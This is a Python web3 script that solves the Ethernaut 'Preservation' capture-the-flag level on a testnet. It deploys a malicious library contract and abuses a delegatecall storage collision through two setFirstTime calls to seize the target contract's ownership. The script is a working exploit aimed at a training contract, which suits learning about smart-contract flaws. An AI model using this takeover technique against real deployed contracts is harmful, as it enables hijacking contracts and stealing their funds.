import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))
malicious_contract_address = ""


def send_transaction_and_wait(transaction):
    transaction = transaction.build_transaction({
        'from': _WALLET,
        'chainId': 11155111,
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Completed transaction: {tx_receipt}')
    return tx_receipt


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


# Step 1: Deploy our own MaliciousLibrary
if malicious_contract_address:
    print('Proceeding with your previously deployed contract', malicious_contract_address)
else:
    compiled_contract = compile_contract("./MaliciousLibrary.sol", "0.8.0")
    malicious_contract = w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract['bin'])
    tx_receipt = send_transaction_and_wait(malicious_contract.constructor())
    # we just need the deployed contract address (not the entire contract)
    malicious_contract_address = tx_receipt["contractAddress"]
    # malicious_contract = w3.eth.contract(address=malicious_contract_address, abi=compiled_contract['abi'])

# Step 2: Load Ethernaut deployed contract
_ethernaut_deployed_address = w3.to_checksum_address("")
compiled_contract = compile_contract("./Preservation.sol", "0.8.0", "Preservation")
preservation_contract = w3.eth.contract(abi=compiled_contract['abi'], address=_ethernaut_deployed_address)
old_address_tz1 = preservation_contract.functions.timeZone1Library().call()
old_owner = preservation_contract.functions.owner().call()
assert old_owner != _WALLET
assert old_address_tz1 != malicious_contract_address
print('FYI: old tz1 address & owner:', old_address_tz1, old_owner)

# Step 3: Call setFirstTime function
send_transaction_and_wait(preservation_contract.functions.setFirstTime(
    # Web3.py is strict about type matching (unlike Solidity, which does implicit conversion)
    int(malicious_contract_address, 16)  # converts an Ethereum address string into a large integer,
    # which is exactly how uint256 is represented in Solidity (a 32-byte unsigned integer)
))
assert preservation_contract.functions.timeZone1Library().call() == malicious_contract_address
print('Changed address of timeZone1Library to our malicious_contract_address')

# Step 4: Call setFirstTime second time to trigger our contract's malicious function
send_transaction_and_wait(preservation_contract.functions.setFirstTime(1234))
assert preservation_contract.functions.owner().call() == _WALLET
print('You have completed this level!!!')
